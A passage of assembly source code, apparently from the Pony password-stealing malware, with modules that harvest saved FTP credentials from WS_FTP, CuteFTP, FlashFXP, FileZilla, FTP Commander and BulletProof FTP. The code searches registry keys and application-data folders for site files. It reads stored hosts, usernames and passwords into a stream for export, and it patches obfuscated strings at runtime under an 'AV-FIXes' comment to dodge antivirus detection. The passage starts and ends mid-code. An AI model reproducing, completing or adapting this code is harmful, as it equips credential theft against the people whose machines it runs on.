	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, addr CWTCRegPath1, addr CWTCRegValue2, NULL
	.IF	eax
		mov	path, eax
		invoke	WTCProcessFile, stream, path
		invoke	MemFree, path
	.ENDIF

	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, addr CWTCRegPath2, addr CWTCRegValue1, NULL
	invoke	WTCCommonProcessDir, stream, eax
	
	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, addr CWTCRegPath2, addr CWTCRegValue2, NULL
	.IF	eax
		mov	path, eax
		invoke	WTCProcessFile, stream, path
		invoke	MemFree, path
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWTC endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Ipswitch WS_FTP client
; http://www.ipswitch.com/
; Tested: WS_FTP Pro 12.3
; Tested: WS_FTP Pro 12.4
; SFTP: implemented

IFDEF COMPILE_MODULE_WS_FTP

.data
	CWS_FTP_Path		db	"\Ipswitch",0
	CWS_FTP_Sites		db	"Sites\",0
	CWS_FTP_Dir		db	"\Ipswitch\WS_FTP",0
	CWS_FTP_WinIni		db	"\win.ini",0
	CWS_FTP_IniMask		db	".ini",0
	CWS_FTP_INI_Section 	db	"WS_FTP",0
	CWS_FTP_INI_ValName1 	db	"DIR",0
	CWS_FTP_INI_ValName2 	db	"DEFDIR",0

.code

WS_FTPProcessFile proc stream, path
	invoke	CommonAppendFile, stream, path, ITEMHDR_ID
	ret
WS_FTPProcessFile endp

WS_FTPFindProfilesOld proc stream, dir, dwType
	LOCAL	FindFileData: WIN32_FIND_DATA
	LOCAL	hFind: DWORD
	LOCAL	path: DWORD
	LOCAL	ininame: DWORD

	mov	path, 0
	
	mov	eax, dir
	.IF	(!eax) || (!byte ptr[eax])
		jmp	@not_found
	.ENDIF
	
	invoke	CheckEndSlash, dir
	.IF	!eax
		invoke	PonyStrCat, dir, offset CCommonFileMask
	.ELSE
		invoke	PonyStrCat, dir, offset CCommonFileMaskNoSlash
	.ENDIF
	mov	path, eax

	invoke	ZeroMemory, addr FindFileData, sizeof WIN32_FIND_DATA

        invoke  FindFirstFile, path, addr FindFileData
        mov     hFind, eax
        inc     eax
        jz      @not_found

@find_loop:
        lea	edx, FindFileData
        test    [edx].WIN32_FIND_DATA.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        .IF	!ZERO?
        	; is directory, scan recursively
        	
        	; skip "." and ".." path names
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	lea	edx, FindFileData
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePPoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
		invoke	PonyStrCat, dir, offset szSlash
        	lea	edx, FindFileData
		lea	edx, [edx].WIN32_FIND_DATA.cFileName		
		invoke	PonyStrCatFreeArg1, eax, edx
		push	eax
		invoke	WS_FTPFindProfilesOld, stream, eax, dwType
		call	MemFree
        	
        	jmp	@skip
        .ENDIF

	lea	eax, [edx].WIN32_FIND_DATA.cFileName
	mov	ininame, eax

	invoke	StrStrI, ininame, offset CWS_FTP_IniMask
	.IF	eax
		invoke	PonyStrCat, dir, offset szSlash
		invoke	PonyStrCatFreeArg1, eax, ininame
		push	eax
		push	eax
		.IF		dwType
			invoke	StrStrI, eax, offset CWS_FTP_Sites
		.ELSE
			mov	eax, TRUE
		.ENDIF
		pop	edx
		.IF	eax
			invoke	WS_FTPProcessFile, stream, edx
		.ENDIF
		call	MemFree
	.ENDIF
       
@skip:
        invoke  FindNextFile, hFind, addr FindFileData
       	test    eax, eax
       	jnz     @find_loop
       	
	invoke	FindClose, hFind
	
@not_found:
	invoke	MemFree, path

	ret
WS_FTPFindProfilesOld endp

WS_FTPFindProfiles proc stream, dwType, szPath
	LOCAL	dir: DWORD
	
	mov	dir, 0
	
	invoke	SHGetFolderPathStr, dwType
	.IF	eax
		mov	dir, eax	
		invoke	PonyStrCat, dir, szPath
		push	eax
		invoke	MemFree, dir		
		pop	dir
	.ENDIF
	
	invoke	WS_FTPFindProfilesOld, stream, dir, TRUE
	
	invoke	MemFree, dir
	ret
WS_FTPFindProfiles endp
  
GrabWS_FTP proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	dir[MAX_PATH+1]: BYTE
	LOCAL	path: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_WS_FTP, 0
	mov	hdr_ofs, eax

	; Windows directory
	invoke	GetWindowsDirectory, addr dir, MAX_PATH
	.IF	eax && eax <= MAX_PATH 
		invoke	PonyStrCat, addr dir, offset CWS_FTP_WinIni
		mov	path, eax
		invoke	GetPrivateProfileString, offset CWS_FTP_INI_Section, offset CWS_FTP_INI_ValName1, offset szNULL, addr dir, MAX_PATH, path
		.IF	eax
			invoke	WS_FTPFindProfilesOld, stream, addr dir, FALSE
		.ENDIF
		invoke	GetPrivateProfileString, offset CWS_FTP_INI_Section, offset CWS_FTP_INI_ValName2, offset szNULL, addr dir, MAX_PATH, path
		.IF	eax
			invoke	WS_FTPFindProfilesOld, stream, addr dir, FALSE
		.ENDIF 
		invoke	MemFree, path
	.ENDIF	

	; Program Files\Common Data
	invoke	SHGetFolderPathStr, CSIDL_PROGRAM_FILES_COMMON
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CWS_FTP_Dir
		push	eax
		invoke	WS_FTPFindProfilesOld, stream, eax, FALSE
		call	MemFree
	.ENDIF  
	
	; Application data folders
	invoke	WS_FTPFindProfiles, stream, CSIDL_APPDATA, offset CWS_FTP_Path
	invoke	WS_FTPFindProfiles, stream, CSIDL_COMMON_APPDATA, offset CWS_FTP_Path
	invoke	WS_FTPFindProfiles, stream, CSIDL_LOCAL_APPDATA, offset CWS_FTP_Path

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWS_FTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; CuteFTP
; http://www.globalscape.com/
; Tested: CuteFTP 8.3.4 Pro/Home/Lite
; SFTP: implemented

IFDEF COMPILE_MODULE_CUTEFTP

.data
	CCuteUninst			db	"CUTEFTP",0
	CCuteFTP_RegValue	db	"QCHistory",0
	CCuteFTP_RegPath1	db	"Software\GlobalSCAPE\CuteFTP 6 Home\QCToolbar",0
	CCuteFTP_RegPath2	db	"Software\GlobalSCAPE\CuteFTP 6 Professional\QCToolbar",0
	CCuteFTP_RegPath3	db	"Software\GlobalSCAPE\CuteFTP 7 Home\QCToolbar",0
	CCuteFTP_RegPath4	db	"Software\GlobalSCAPE\CuteFTP 7 Professional\QCToolbar",0
	CCuteFTP_RegPath5	db	"Software\GlobalSCAPE\CuteFTP 8 Home\QCToolbar",0
	CCuteFTP_RegPath6	db	"Software\GlobalSCAPE\CuteFTP 8 Professional\QCToolbar",0
	CCuteFTP_RegPath7	db	"Software\GlobalSCAPE\CuteFTP 9\QCToolbar",0
	
	CCuteFTP_File1		db	"\GlobalSCAPE\CuteFTP",0
	CCuteFTP_File2		db	"\GlobalSCAPE\CuteFTP Pro",0
	CCuteFTP_File3		db	"\GlobalSCAPE\CuteFTP Lite",0
	CCuteFTP_File4		db	"\CuteFTP",0
	CCuteFTP_Filename	db	"\sm.dat",0	
.code

CuteFTPProcessFile proc stream, path
	invoke	 CommonAppendFile, stream, path, ITEMHDR_ID 
	ret
CuteFTPProcessFile endp

CuteFTPProcessQuickConnections proc stream, path
	LOCAL	len: DWORD
	LOCAL	mem: DWORD
	
	mov	len, 0
	invoke	RegReadValueStr, dwCurrentUserKey, path, offset CCuteFTP_RegValue, addr len
	.IF	eax
		mov	mem, eax	
		invoke	CommonAppendData, stream, mem, len, ITEMHDR_ID or 1
		invoke	MemFree, mem		
	.ENDIF
	ret
CuteFTPProcessQuickConnections endp
    
CuteFTPFindDats proc stream, dir, filename
	LOCAL	FindFileData: WIN32_FIND_DATA
	LOCAL	hFind: DWORD
	LOCAL	path: DWORD
	LOCAL	ininame: DWORD

	mov	path, 0
	
	mov	eax, dir
	.IF	(!eax) || (!byte ptr[eax])
		jmp	@not_found
	.ENDIF

	invoke	PonyStrCat, dir, filename
	push	eax
	invoke	CuteFTPProcessFile, stream, eax
	call	MemFree
	
	invoke	PonyStrCat, dir, offset CCommonFileMask
	mov	path, eax
	
	invoke	ZeroMemory, addr FindFileData, sizeof WIN32_FIND_DATA

        invoke  FindFirstFile, path, addr FindFileData
        mov     hFind, eax
        inc     eax
        jz      @not_found

@find_loop:
        lea	edx, FindFileData
        test    [edx].WIN32_FIND_DATA.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        .IF	!ZERO?
        	; skip "." and ".." paths
        	lea	edx, FindFileData
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	lea	edx, FindFileData
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePPoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	lea	edx, FindFileData
		lea	eax, [edx].WIN32_FIND_DATA.cFileName
		mov	ininame, eax

		invoke	PonyStrCat, dir, offset szSlash
		invoke	PonyStrCatFreeArg1, eax, ininame
		invoke	PonyStrCatFreeArg1, eax, filename
		push	eax
		invoke	CuteFTPProcessFile, stream, eax
		call	MemFree
	.ENDIF
       
@skip:
        invoke  FindNextFile, hFind, addr FindFileData
       	test    eax, eax
       	jnz     @find_loop
       	
	invoke	FindClose, hFind
	
@not_found:
	invoke	MemFree, path

	ret
CuteFTPFindDats endp
 
CommonCuteFTPGrab proc stream, csidl
	LOCAL	path: DWORD
	
	invoke	SHGetFolderPathStr, csidl
	mov	path, eax
	.IF	eax
		invoke	PonyStrCat, path, offset CCuteFTP_File1
		push	eax
		invoke	CuteFTPFindDats, stream, eax, offset CCuteFTP_Filename
		call	MemFree
		invoke	PonyStrCat, path, offset CCuteFTP_File2
		push	eax
		invoke	CuteFTPFindDats, stream, eax, offset CCuteFTP_Filename
		call	MemFree
		invoke	PonyStrCat, path, offset CCuteFTP_File3
		push	eax
		invoke	CuteFTPFindDats, stream, eax, offset CCuteFTP_Filename
		call	MemFree
		invoke	PonyStrCat, path, offset CCuteFTP_File4
		push	eax
		invoke	CuteFTPFindDats, stream, eax, offset CCuteFTP_Filename
		call	MemFree
		
		invoke	MemFree, path		
	.ENDIF
	ret
CommonCuteFTPGrab endp
 
GrabCuteFTP proc uses edi stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_CUTEFTP, 0
	mov	hdr_ofs, eax

	; installed list
	mov	edi, lpInstalledList 
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CCuteUninst
		.IF	eax
			invoke	ExtractFilePath, edi
			.IF	eax
				push	eax
				invoke	CuteFTPFindDats, stream, eax, offset CCuteFTP_Filename
				call	MemFree
			.ENDIF
		.ENDIF
		@Next	@n
	.ENDIF

	; application data
	invoke	CommonCuteFTPGrab, stream, CSIDL_APPDATA
	invoke	CommonCuteFTPGrab, stream, CSIDL_COMMON_APPDATA
	invoke	CommonCuteFTPGrab, stream, CSIDL_LOCAL_APPDATA
	invoke	CommonCuteFTPGrab, stream, CSIDL_PROGRAM_FILES
	
	; quick connection passwords stored in registry
	invoke	CuteFTPProcessQuickConnections, stream, offset CCuteFTP_RegPath1
	invoke	CuteFTPProcessQuickConnections, stream, offset CCuteFTP_RegPath2
	invoke	CuteFTPProcessQuickConnections, stream, offset CCuteFTP_RegPath3
	invoke	CuteFTPProcessQuickConnections, stream, offset CCuteFTP_RegPath4
	invoke	CuteFTPProcessQuickConnections, stream, offset CCuteFTP_RegPath5
	invoke	CuteFTPProcessQuickConnections, stream, offset CCuteFTP_RegPath6
	invoke	CuteFTPProcessQuickConnections, stream, offset CCuteFTP_RegPath7

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabCuteFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FlashFXP
; http://www.flashfxp.com/
; Tested: v4.0 build 1548
; Tested: v4.1.0 build 1615
; Tested: v4.2.3 build 1771
; SFTP: implemented

IFDEF COMPILE_MODULE_FLASHFXP

.data

CFlashFXP_RegPath1	db	'_oftware\FlashFXP\3',0
CFlashFXP_RegPath2	db	'_oftware\FlashFXP',0
CFlashFXP_RegPath3	db	'_oftware\FlashFXP\4',0
CFlashFXP_RegValue1	db	'InstallerDathPath',0
CFlashFXP_RegValue2	db	'path',0
CFlashFXP_RegValue3	db	'Install Path',0
CFlashFXP_RegValue4	db	'DataFolder',0
CFlashFXP_SiteName	db	'\Sites.dat',0
CFlashFXP_QuickName	db	'\Quick.dat',0
CFlashFXP_HistoryName	db	'\_istory.dat',0
CFlashFXP_AppDataDir1	db	'\FlashFXP\3',0
CFlashFXP_AppDataDir2	db	'\FlashFXP\4',0

.code

FlashFXPProcessFile proc stream, path, dwType
	.IF	path
		invoke	CommonAppendFile, stream, path, dwType
		invoke	MemFree, path
	.ENDIF
	ret
FlashFXPProcessFile endp

FlashFXPReg proc stream, Key, RegPath, RegValue
	LOCAL	path: DWORD
	
	invoke	RegReadValueStr, Key, RegPath, RegValue, NULL
	.IF	eax
		mov	path, eax
		
		invoke	PonyStrCat, path, offset CFlashFXP_SiteName
		invoke	FlashFXPProcessFile, stream, eax, ITEMHDR_ID or 0 
		invoke	PonyStrCat, path, offset CFlashFXP_QuickName
		invoke	FlashFXPProcessFile, stream, eax, ITEMHDR_ID or 1
		invoke	PonyStrCat, path, offset CFlashFXP_HistoryName
		invoke	FlashFXPProcessFile, stream, eax, ITEMHDR_ID or 2
		
		invoke	MemFree, path
	.ENDIF
	
	ret
FlashFXPReg endp

ProcessFXPAppDataCommon proc stream, path, filename, dwType
	invoke	PonyStrCat, path, offset CFlashFXP_AppDataDir1
	invoke	PonyStrCatFreeArg1, eax, filename
	invoke	FlashFXPProcessFile, stream, eax, dwType
	invoke	PonyStrCat, path, offset CFlashFXP_AppDataDir2
	invoke	PonyStrCatFreeArg1, eax, filename
	invoke	FlashFXPProcessFile, stream, eax, dwType
	ret
ProcessFXPAppDataCommon endp

ProcessFXPAppData proc stream, csidl
	LOCAL	path: DWORD
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		mov	path, eax
		invoke	ProcessFXPAppDataCommon, stream, path, offset CFlashFXP_SiteName, ITEMHDR_ID or 0 
		invoke	ProcessFXPAppDataCommon, stream, path, offset CFlashFXP_QuickName, ITEMHDR_ID or 1 
		invoke	ProcessFXPAppDataCommon, stream, path, offset CFlashFXP_HistoryName, ITEMHDR_ID or 2 
		invoke	MemFree, path
	.ENDIF
	ret
ProcessFXPAppData endp

GrabFlashFXP proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_FLASHFXP, 0
	mov	hdr_ofs, eax

	; AV-FIXes
	mov	byte ptr[CFlashFXP_RegPath1], 'S'
	mov	byte ptr[CFlashFXP_RegPath2], 'S'
	mov	byte ptr[CFlashFXP_RegPath3], 'S'
	mov	byte ptr[CFlashFXP_HistoryName+1], 'H'

	invoke	FlashFXPReg, stream, dwCurrentUserKey, offset CFlashFXP_RegPath1, offset CFlashFXP_RegValue1
	invoke	FlashFXPReg, stream, dwCurrentUserKey, offset CFlashFXP_RegPath2, offset CFlashFXP_RegValue2
	invoke	FlashFXPReg, stream, dwCurrentUserKey, offset CFlashFXP_RegPath1, offset CFlashFXP_RegValue3
	invoke	FlashFXPReg, stream, dwCurrentUserKey, offset CFlashFXP_RegPath1, offset CFlashFXP_RegValue4

	invoke	FlashFXPReg, stream, dwCurrentUserKey, offset CFlashFXP_RegPath3, offset CFlashFXP_RegValue1
	invoke	FlashFXPReg, stream, dwCurrentUserKey, offset CFlashFXP_RegPath3, offset CFlashFXP_RegValue2
	invoke	FlashFXPReg, stream, dwCurrentUserKey, offset CFlashFXP_RegPath3, offset CFlashFXP_RegValue3
	invoke	FlashFXPReg, stream, dwCurrentUserKey, offset CFlashFXP_RegPath3, offset CFlashFXP_RegValue4

	invoke	FlashFXPReg, stream, HKEY_LOCAL_MACHINE, offset CFlashFXP_RegPath1, offset CFlashFXP_RegValue1
	invoke	FlashFXPReg, stream, HKEY_LOCAL_MACHINE, offset CFlashFXP_RegPath2, offset CFlashFXP_RegValue2
	invoke	FlashFXPReg, stream, HKEY_LOCAL_MACHINE, offset CFlashFXP_RegPath1, offset CFlashFXP_RegValue3
	invoke	FlashFXPReg, stream, HKEY_LOCAL_MACHINE, offset CFlashFXP_RegPath1, offset CFlashFXP_RegValue4

	invoke	FlashFXPReg, stream, HKEY_LOCAL_MACHINE, offset CFlashFXP_RegPath3, offset CFlashFXP_RegValue1
	invoke	FlashFXPReg, stream, HKEY_LOCAL_MACHINE, offset CFlashFXP_RegPath3, offset CFlashFXP_RegValue2
	invoke	FlashFXPReg, stream, HKEY_LOCAL_MACHINE, offset CFlashFXP_RegPath3, offset CFlashFXP_RegValue3
	invoke	FlashFXPReg, stream, HKEY_LOCAL_MACHINE, offset CFlashFXP_RegPath3, offset CFlashFXP_RegValue4

	invoke	ProcessFXPAppData, stream, CSIDL_APPDATA
	invoke	ProcessFXPAppData, stream, CSIDL_COMMON_APPDATA
	invoke	ProcessFXPAppData, stream, CSIDL_LOCAL_APPDATA

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFlashFXP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FileZilla
; http://filezilla-project.org/
; Tested 2.2.19a
; Tested 3.5.0
; Tested 3.5.2
; Tested 3.5.3
; SFTP: implemented

IFDEF COMPILE_MODULE_FILEZILLA

.data
	CFileZillaFolder	db	'\FileZilla',0
	CFileZillaFileName1	db	'\sitemanager.xml',0
	CFileZillaFileName2	db	'\recentservers.xml',0
	CFileZillaFileName3	db	'\filezilla.xml',0
	CFileZillaRegPath1	db	'Software\FileZilla',0
	CFileZillaRegPath2	db	'Software\FileZilla Client',0
	CFileZillaRegValue	db	'Install_Dir',0
	
	szFileZillaHost1	db	'Host',0
	szFileZillaUser1	db	'User',0
	szFileZillaPass1	db	'Pass',0
	szFileZillaPort1	db	'Port',0
	szFileZillaDir1		db	'Remote Dir',0
	szFileZillaProt1	db	'Server Type',0

	szFileZillaHost2	db	'Server.Host',0
	szFileZillaUser2	db	'Server.User',0
	szFileZillaPass2	db	'Server.Pass',0
	szFileZillaPort2	db	'Server.Port',0
	szFileZillaDir2		db	'Path',0
	szFileZillaProt2	db	'ServerType',0

	szFileZillaHost3	db	'Last Server Host',0
	szFileZillaUser3	db	'Last Server User',0
	szFileZillaPass3	db	'Last Server Pass',0
	szFileZillaPort3	db	'Last Server Port',0
	szFileZillaDir3		db	'Last Server Path',0
	szFileZillaProt3	db	'Last Server Type',0

.code

FileZillaGrabFiles proc stream, path
	.IF	path
		invoke	PonyStrCat, path, offset CFileZillaFileName1
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 0
		call	MemFree
		invoke	PonyStrCat, path, offset CFileZillaFileName2
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 1
		call	MemFree
		invoke	PonyStrCat, path, offset CFileZillaFileName3
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 2
		call	MemFree
	.ENDIF
	ret
FileZillaGrabFiles endp

FileZillaCommonGrab proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CFileZillaFolder
		push	eax
		invoke	FileZillaGrabFiles, stream, eax
		call	MemFree		
	.ENDIF
	ret
FileZillaCommonGrab endp

; dwType(4): Port is stored as DWORD
; dwType(3): Port is stored as String
FileZillaCommonRegRead proc stream, RegPath, lpFileZillaPass, lpFileZillaHost, lpFileZillaUser, lpFileZillaPort, lpFileZillaDir, lpFileZillaProt, dwType
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	Dir: DWORD
	LOCAL	PortLen: DWORD
	LOCAL	Protocol: DWORD
	LOCAL	ProtocolLen: DWORD

	invoke	RegReadValueStr, dwCurrentUserKey, RegPath, lpFileZillaPass, NULL
	mov	Password, eax 
	invoke	RegReadValueStr, dwCurrentUserKey, RegPath, lpFileZillaHost, NULL
	mov	Host, eax 
	invoke	RegReadValueStr, dwCurrentUserKey, RegPath, lpFileZillaUser, NULL
	mov	User, eax
	invoke	RegReadValueStr, dwCurrentUserKey, RegPath, lpFileZillaPort, addr PortLen
	mov	Port, eax
	invoke	RegReadValueStr, dwCurrentUserKey, RegPath, lpFileZillaDir, NULL
	mov	Dir, eax
	invoke	RegReadValueStr, dwCurrentUserKey, RegPath, lpFileZillaProt, addr ProtocolLen
	mov	Protocol, eax
	
	.IF	Host && User && Password
		; export data, type = 0003/0004: Host | User | Pass | Port | Dir
		; export data, type = 0013/0014: Host | User | Pass | Port | Dir | Protocol
		invoke	StreamWriteDWORD, stream, dwType
		invoke	StreamWriteString, stream, Host
		invoke	StreamWriteString, stream, User
		invoke	StreamWriteString, stream, Password
		.IF	dwType == ITEMHDR_ID or 13h
			; Port stored as string (REG_SZ)
			invoke	StreamWriteString, stream, Port
		.ELSE
			; Port stored as DWORD (REG_DWORD)
			invoke	StreamWriteBinaryString, stream, Port, PortLen
		.ENDIF
		invoke	StreamWriteString, stream, Dir

		; Export Protocol
		.IF	Protocol && ProtocolLen == 4
			mov	eax, Protocol
			invoke	StreamWriteDWORD, stream, dword ptr[eax]
		.ELSE
			invoke	StreamWriteDWORD, stream, 0
		.ENDIF
	.ENDIF
	
	invoke	MemFree, Password
	invoke	MemFree, Host
	invoke	MemFree, User
	invoke	MemFree, Port
	invoke	MemFree, Dir
	invoke	MemFree, Protocol
	
	ret
FileZillaCommonRegRead endp

FileZillaScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	
	invoke	FileZillaCommonRegRead, stream, BasePath, addr szFileZillaPass1, addr szFileZillaHost1, addr szFileZillaUser1, addr szFileZillaPort1, addr szFileZillaDir1, addr szFileZillaProt1, ITEMHDR_ID or 13h
	invoke	FileZillaCommonRegRead, stream, BasePath, addr szFileZillaPass2, addr szFileZillaHost2, addr szFileZillaUser2, addr szFileZillaPort2, addr szFileZillaDir2, addr szFileZillaProt2, ITEMHDR_ID or 13h
	invoke	FileZillaCommonRegRead, stream, BasePath, addr szFileZillaPass3, addr szFileZillaHost3, addr szFileZillaUser3, addr szFileZillaPort3, addr szFileZillaDir3, addr szFileZillaProt3, ITEMHDR_ID or 14h
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			; BasePath + '\' + lpBuf
			invoke	PonyStrCat, BasePath, addr szSlash
			mov	edx, eax
			invoke	PonyStrCatFreeArg1, edx, addr lpBuf
			mov	S, eax
			
			; recursively scan subfolders
			invoke	FileZillaScanReg, stream, S			
			invoke	MemFree, S
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
FileZillaScanReg endp

GrabFileZilla proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_FILEZILLA, 0
	mov	hdr_ofs, eax

	invoke	FileZillaScanReg, stream, offset CFileZillaRegPath1
	
	invoke	RegReadValueStr, dwCurrentUserKey, offset CFileZillaRegPath1, offset CFileZillaRegValue, NULL
	.IF	eax
		push	eax
		invoke	FileZillaGrabFiles, stream, eax
		call	MemFree
	.ENDIF
	invoke	RegReadValueStr, dwCurrentUserKey, offset CFileZillaRegPath2, offset szNULL, NULL
	.IF	eax
		push	eax
		invoke	FileZillaGrabFiles, stream, eax
		call	MemFree
	.ENDIF
	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, offset CFileZillaRegPath1, offset CFileZillaRegValue, NULL
	.IF	eax
		push	eax
		invoke	FileZillaGrabFiles, stream, eax
		call	MemFree
	.ENDIF
	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, offset CFileZillaRegPath2, offset szNULL, NULL
	.IF	eax
		push	eax
		invoke	FileZillaGrabFiles, stream, eax
		call	MemFree
	.ENDIF

	invoke	FileZillaCommonGrab, stream, CSIDL_APPDATA
	invoke	FileZillaCommonGrab, stream, CSIDL_COMMON_APPDATA
	invoke	FileZillaCommonGrab, stream, CSIDL_LOCAL_APPDATA

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFileZilla endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTP Commander
; http://www.internet-soft.com/ftpcomm.htm
; Tested: FTP Commander Free 8.02 / Deluxe 9.2 / Pro 8.03
; SFTP: implemented
                                                
IFDEF COMPILE_MODULE_FTPCOMMANDER

.data
	CFTPCommanderUninst1	db	'FTP Navigator',0
	CFTPCommanderUninst2	db	'FTP Commander',0
	CFTPCommanderIniMask	db	'ftplist.txt',0

.code

GrabFTPCommander proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_FTPCOMMANDER, 0
	mov	hdr_ofs, eax

	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CFTPCommanderUninst1
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset CFTPCommanderIniMask, ITEMHDR_ID or 0 
			call	MemFree
		.ENDIF
		invoke	StrStrI, edi, offset CFTPCommanderUninst2
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset CFTPCommanderIniMask, ITEMHDR_ID or 0
			call	MemFree			
		.ENDIF		
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPCommander endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; BulletProof FTP
; http://www.bpftp.com/products/bpftpclient/windows/download
; Tested: Version 2010.75.0.75
; Tested: Version 2010.75.0.76
; SFTP: not supported

IFDEF COMPILE_MODULE_BULLETPROOF

.data
	CBullerAppDataDir	db	'\BulletProof Software',0
	CBulletDatMask		db	'.dat',0
	CBulletBpsMask		db	'.bps',0
	CBulletRegPath1		db	'Software\BPFTP\Bullet Proof FTP\Main',0
	CBulletRegPath2		db	'Software\BulletProof Software\BulletProof FTP Client\Main',0
	CBulletRegPath3		db	'Software\BPFTP\Bullet Proof FTP\Options',0
	CBulletRegPath4		db	'Software\BulletProof Software\BulletProof FTP Client\Options',0
	CBulletRegPath5		db	'Software\BPFTP',0
	CBulletRegValue1	db	'LastSessionFile',0	
	CBulletRegValue2	db	'SitesDir',0
	CBulletRegValue3	db	'InstallDir1',0

.code

BulletProofRecScan proc stream, file_path
	invoke	CommonFileScan, stream, file_path, offset CBulletDatMask, ITEMHDR_ID or 0
	invoke	CommonFileScan, stream, file_path, offset CBulletBpsMask, ITEMHDR_ID or 1
	ret
BulletProofRecScan endp

BulletProofCommonFileScan proc stream, csidl
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CBullerAppDataDir
		push	eax
		invoke	BulletProofRecScan, stream, eax
		call	MemFree
	.ENDIF
	ret
BulletProofCommonFileScan endp

GrabBulletProof proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_BULLETPROOF, 0
	mov	hdr_ofs, eax
	
	; bps file path in registry
	invoke	RegReadValueStr, dwCurrentUserKey, offset CBulletRegPath1, offset CBulletRegValue1, NULL
	.IF	eax
		push	eax
		invoke	CommonAppendFile, stream, eax, ITEMHDR_ID or 1
		call	MemFree
	.ENDIF

	invoke	RegReadValueStr, dwCurrentUserKey, offset CBulletRegPath2, offset CBulletRegValue1, NULL
	.IF	eax
		push	eax
